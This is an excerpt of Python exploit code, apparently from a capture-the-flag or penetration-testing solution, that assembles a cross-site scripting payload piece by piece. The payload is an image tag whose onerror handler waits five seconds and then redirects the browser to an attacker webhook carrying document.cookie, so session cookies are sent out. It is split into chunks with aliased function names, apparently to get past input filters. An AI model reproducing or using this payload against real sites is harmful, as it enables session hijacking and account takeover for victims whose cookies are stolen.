...
chunks.append(create_chunk('();},', 2))
chunks.append(create_chunk('5000);', 2))
...
#admin_payload = "<img src =x onerror='setTimeout(function(){window.location =\"WEBHOOK?p=\" + document.cookie;},5000);'>"
# For admin to craft

admin_payload = list()

admin_payload.append(create_chunk_admin("<img src=`x` onerror=`", 1))
admin_payload.extend(create_var_admin(webhook, "w"))
admin_payload.extend(create_var_admin("setTimeout", "t"))
admin_payload.extend(create_var_admin("getElementById", "e"))

admin_payload.append(create_chunk_admin("window[t](function(){window.location=w", 2))
admin_payload.append(create_chunk_admin('%2B document.cookie;},5000);`>', 3))
...
chunks.append(create_chunk("5000);'>", 3))
